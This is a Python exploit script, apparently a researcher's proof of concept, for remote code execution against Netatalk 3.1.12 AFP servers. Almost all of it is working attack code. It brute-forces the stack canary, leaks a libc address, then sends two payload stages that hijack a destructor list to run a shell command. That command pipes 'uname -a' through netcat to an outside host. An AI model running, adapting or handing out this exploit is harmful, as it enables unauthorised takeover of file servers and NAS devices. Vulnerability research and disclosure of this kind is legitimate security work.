#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   afp.py    
@Contact :   lihanwei@zhiqiansec.com
@DateTime :  2022/9/20 11:34 PM 
'''

import struct
import socket
import time

R_HOST = "192.168.2.234"
R_PORT = 548

SUPPORT_VERSION = ["Netatalk3.1.12"]

DSI_CloseSession     = 0x01
DSI_Common           = 0x02
DSI_FPGetSrvrInfo    = 0x03
DSI_OpenSession      = 0x04

MAX_RECV_LENGTH = 4096
DSI_SERVQUANT_DEF = 0x100000

nl_global_locale_padding_offset = 0x102678
dtor_list_padding_offset = 0x1026b0
tls_padding_length = 0x1026f0    # padding to TLS
nl_global_locale_offset = 0x3c5420
username_address = 0x656190
username = ("iot".ljust(16, "\x00")).encode()
command = b"`uname -a | nc 192.168.2.53 443`"


class DSI():
    def __init__(self, dsi_flags, dsi_command, dsi_requestID, dsi_dataOffset, dsi_len, dsi_reserved):
        self.dsi_flags = dsi_flags
        self.dsi_command = dsi_command
        self.dsi_requestID = dsi_requestID
        self.dsi_dataOffset = dsi_dataOffset
        self.dsi_len = dsi_len
        self.dsi_reserved = dsi_reserved

        self.header_length = 16

    def _gen_packet(self, data=b""):
        packet = b""
        packet += struct.pack("!B", self.dsi_flags)
        packet += struct.pack("!B", self.dsi_command)
        packet += struct.pack("!H", self.dsi_requestID)
        packet += struct.pack("!I", self.dsi_dataOffset)
        packet += struct.pack("!I", self.dsi_len)
        packet += struct.pack("!I", self.dsi_reserved)
        packet += data
        return packet

def _get_body_error_code(packet):
    flags = packet[0]
    command = packet[1]
    request_id = packet[2:4]
    error_code = struct.unpack(">I", packet[4:8])
    length = struct.unpack(">I", packet[8:12])[0]
    reserved = packet[12:16]

    body = packet[16:length + 16]
    if length != len(body):
        print("[-] Invalid packet length")
        exit(0)

    return (error_code, body)

def simple_parse_srvInfo(data):
    # https://github.com/rapid7/metasploit-framework/pull/216/files
    error_code,body = _get_body_error_code(data)

    machine_type_offset = struct.unpack(">H", body[0:2])[0]
    version_count_offset = body[2:4]
    uam_count_offset = body[4:6]
    icon_offset = body[6:8]
    flags = body[8:10]

    server_name_length = body[10]
    server_name = body[11:server_name_length + 11]
    print("[+] Got server name: %s" % server_name.decode())

    pos = 10 + server_name_length + 1
    if pos % 2 != 0:
        pos += 1    # padding

    server_signature_offset = body[pos:pos + 2]
    network_addresses_count_offset = body[pos + 2:pos + 4]
    directory_names_count_offset = body[pos + 4:pos + 6]
    utf8_server_name_offset = body[pos + 6:pos + 8]

    machine_type_length = body[machine_type_offset]
    machine_type = body[pos + 9:pos + machine_type_length + 9]
    print("[+] Got machine type: %s" % machine_type.decode())
    if machine_type.decode() not in SUPPORT_VERSION:
        print("[-] Target not support.")
        exit(0)
    # continue parse seems not necessary
    return

def simple_parse_openSession(data):
    error_code,body = _get_body_error_code(data)
    if error_code[0] != 0:
        print("[-] OpenSession failed.")
        exit(0)
    # print("[+] OpenSession success")
    return

def connect_open_session():
    s = None
    try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((R_HOST, R_PORT))
    except:
        print("[-] Error connecting server")
        exit(0)
    # print("[*] OpenSession")
    _open_session_packet = DSI(0x0, DSI_OpenSession, 0x0, 0x0, 0x0, 0x0)._gen_packet()
    s.send(_open_session_packet)
    simple_parse_openSession(s.recv(MAX_RECV_LENGTH))
    return s

def _leak_one(sock, canary):
    payload = b"a" * tls_padding_length + b"tcb__ptr" + b"dtv__ptr" + b"self_ptr" + b"mult" + b"scop" + b"_sysinfo"
    payload += canary
    payload_len = len(payload)
    _packet = DSI(0x0, DSI_Common, 0x0, payload_len, 0x0, 0x0)._gen_packet() + payload
    sock.send(_packet)
    # time.sleep(1)
    data = sock.recv(MAX_RECV_LENGTH)
    if len(data) == 0:
        return False
    return True

def _leak(n, canary):
    print("[*] ==== Byte%d ====" % n)
    _succ = None
    for i in range(1, 0x100):
        # print("[*]     Trying " + str(i))
        try:
            sock = connect_open_session()
            _tmp = struct.pack("<Q", ((i << (n * 8)) | canary))[:n + 1]
            if _leak_one(sock, _tmp):
                canary = ((i << 8) | canary)
                break
            sock.close()
        except:
            time.sleep(0.1)
    print("[+] Got byte%d: %d" % (n, i))
    # if i == 0:
    #     print("[-] Error leaking canary. Try again")
    #     exit(0)
    return i

def leak_canary():
    canary = 0x0    # canary lowest byte == 0x00
    print("[*] Leaking canary (stable)...")
    canary |= (_leak(1, canary) << 8)
    canary |= (_leak(2, canary) << 16)
    canary |= (_leak(3, canary) << 24)
    canary |= (_leak(4, canary) << 32)
    canary |= (_leak(5, canary) << 40)
    canary |= (_leak(6, canary) << 48)
    canary |= (_leak(7, canary) << 56)
    print("[+] Got canary: " + hex(canary))
    return canary

def _leak_one2(sock, value):
    payload = b"\x00" * nl_global_locale_padding_offset
    payload += value
    payload_len = len(payload)
    _crash_packet = DSI(0x0, DSI_Common, 0x0, payload_len, 0x0, 0x0)._gen_packet() + payload
    sock.sendall(_crash_packet)

    _close_packet = DSI(0x0, DSI_CloseSession, 0x0, 0x0, 0x0, 0x0)._gen_packet()
    sock.sendall(_close_packet)
    sock.recv(MAX_RECV_LENGTH)
    sock.send(b"aaaaaaaa")
    sock.recv(MAX_RECV_LENGTH)


def _leak2(n, global_locale, _step=1):
    print("[*] ==== Byte%d ====" % n)
    vals = []
    _succ = None
    for i in range(0, 0x100, _step):
        # print("[*]     Trying " + str(i))
        try:
            sock = connect_open_session()
            _tmp = struct.pack("<Q", (((i) << (n * 8)) | global_locale))[:n + 1]
            if _step == 0x10:
                _tmp = struct.pack("<Q", (((i + 4) << (n * 8)) | global_locale))[:n + 1]
            # print(_tmp)
            _leak_one2(sock, _tmp)
            if _step == 0x10:
                vals.append(i + 4)
            else:
                vals.append(i)
        except:
            time.sleep(0.1)
    return vals

def leak_libc():
    global_locale = 0
    print("[*] Leaking libc (unstable)...")

    byte0 = [0x20]
    byte1 = []
    byte2 = []
    byte3 = []
    byte4 = []
    byte5 = [0x7f]

    print("[!] Detect %d possible val(s) for byte0" % len(byte0))
    for m_byte0 in byte0:
        global_locale = global_locale | m_byte0
        byte1 = _leak2(1, global_locale, 0x10)
        if len(byte1) == 0:
            print("[!] %d not right" % m_byte0)
            continue
        break

    print(byte1)
    if len(byte1) == 0:
        print("[-] Error leaking libc address. Try again.")
        exit(0)

    if len(byte1) > 1:
        print("[!] Warning: more than 1 value detected. The result maybe unreliable.")

    print("[!] Detect %d possible val(s) for byte1" % len(byte1))
    for m_byte1 in byte1:
        global_locale = global_locale | (m_byte1 << 8)
        byte2 = _leak2(2, global_locale)
        if len(byte2) == 0:
            print("[!] %d not right" % m_byte1)
            global_locale &= (0x00 << 8)
            continue
        break

    print(byte2)
    if len(byte2) == 0:
        print("[-] Error leaking libc address. Try again.")
        exit(0)

    if len(byte2) > 1:
        print("[!] Warning: more than 1 value detected. The result maybe unreliable.")

    print("[!] Detect %d possible val(s) for byte2" % len(byte2))
    for m_byte2 in byte2:
        global_locale = global_locale | (m_byte2 << 16)
        byte3 = _leak2(3, global_locale)
        if len(byte3) == 0:
            print("[!] %d not right" % m_byte2)
            global_locale &= (0x00 << 16)
            continue
        break

    print(byte3)
    if len(byte3) == 0:
        print("[-] Error leaking libc address. Try again.")
        exit(0)

    if len(byte3) > 1:
        print("[!] Warning: more than 1 value detected. The result maybe unreliable.")

    print("[!] Detect %d possible val(s) for byte3" % len(byte3))
    for m_byte3 in byte3:
        global_locale = global_locale | (m_byte3 << 24)
        byte4 = _leak2(4, global_locale)
        if len(byte4) == 0:
            print("[!] %d not right" % m_byte3)
            global_locale &= (0x00 << 24)
            continue
        break

    print(byte4)
    if len(byte4) == 0:
        print("[-] Error leaking libc address. Try again.")
        exit(0)

    if len(byte4) > 1:
        print("[!] Warning: more than 1 value detected. The result maybe unreliable.")

    print("[!] Detect %d possible val(s) for byte4" % len(byte4))
    for m_byte4 in byte4:
        global_locale = global_locale | (m_byte4 << 32)
        byte5 = _leak2(5, global_locale)
        if len(byte5) == 0:
            print("[!] %d not right" % m_byte4)
            global_locale &= (0x00 << 32)
            continue
        break

    print(byte5)
    if len(byte5) == 0:
        print("[-] Error leaking libc address. Try again.")
        exit(0)

    if len(byte5) > 1:
        print("[!] Warning: more than 1 value detected. The result maybe unreliable.")

    global_locale |= (byte5[0] << 40)
    libc_addr = global_locale - nl_global_locale_offset
    print("[+] Got libc: " + hex(libc_addr))
    return libc_addr

def ISHFTC(n, d, N):
    return ((n << d) % (1 << N)) | (n >> (N - d))

if __name__ == "__main__":
    print("[*] Connecting to %s:%d ..." % (R_HOST, R_PORT))
    s = None
    try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((R_HOST, R_PORT))
    except:
        print("[-] Error connecting server")
        exit(0)

    print("[*] Fetching server info ...")
    _get_srv_info_packet = DSI(0x0, DSI_FPGetSrvrInfo, 0x0101, 0x0, 0x0, 0x0)._gen_packet()
    s.send(_get_srv_info_packet)
    simple_parse_srvInfo(s.recv(MAX_RECV_LENGTH))
    s.close()

    print("")
    canary = leak_canary()

    print("")
    time.sleep(3)
    libc_addr = leak_libc()

    s = connect_open_session()

    print("[*] Deploy payload (stage 1)")

    enc_system_address = ISHFTC(libc_addr + 0x0000000000453A0, 0x11, 64)
    enc_execl_addr = ISHFTC(0x000000000408DA0, 0x11, 64)
    enc_popen_addr = ISHFTC(libc_addr + 0x00000000006F610, 0x11, 64)
    setcontext_addr = ISHFTC(libc_addr + 0x000000000047B97, 0x11, 64)

    fake_dtor_list = struct.pack("<Q", setcontext_addr) + \
                     struct.pack("<Q", username_address) + \
                     struct.pack("<Q", 0x0) + \
                     struct.pack("<Q", 0x0)

    gold = fake_dtor_list + struct.pack("<Q", setcontext_addr) + b"\x00" * 0x20 + struct.pack("<Q", 0x656240) + b"\x00" * (0x80 - 0x20 - 8) + struct.pack("<Q", libc_addr + 0x00000000006F5B6) + command

    payload = b"\x12" + b"\x06\x41\x46\x50\x33\x2e\x33" + b"\x04\x44\x48\x58\x32" + struct.pack("<B", len(gold) + 0x10) + username + gold + b"\x00"
    payload_len = len(payload)
    _fplogin_packet = DSI(0x0, DSI_Common, 0x0, 0x0, payload_len, 0x0)._gen_packet() + payload
    s.send(_fplogin_packet)
    s.recv(MAX_RECV_LENGTH)

    print("[*] Deploy payload (stage 2)")

    payload = b"a" * nl_global_locale_padding_offset + struct.pack("<Q", libc_addr + nl_global_locale_offset) + struct.pack("<Q", libc_addr + 0x3c8a80) + struct.pack("<Q", 0xb) + struct.pack("<Q", libc_addr + 0x1767a0) + struct.pack("<Q", libc_addr + 0x176da0) + struct.pack("<Q", libc_addr + 0x1776a0) + b"a" * 8 + struct.pack("<Q", username_address) + struct.pack("<Q", libc_addr + 0x3c4b20) + b"\x00" * 48 + struct.pack("<Q", 0xc7a700 + libc_addr) + struct.pack("<Q", libc_addr + 0xc79010) + struct.pack("<Q", 0xc7a700 + libc_addr) + b"a" * 16 + struct.pack("<Q", canary) + b"\x00" * 8
    payload_len = len(payload)
    _test_packet = DSI(0x0, DSI_Common, 0x0, payload_len, 0x0, 0x0)._gen_packet() + payload
    s.send(_test_packet)

    _close_packet = DSI(0x0, DSI_CloseSession, 0x0, 0x0, 0x0, 0x0)._gen_packet()
    s.send(_close_packet)
    print("[+] Exploit finish.")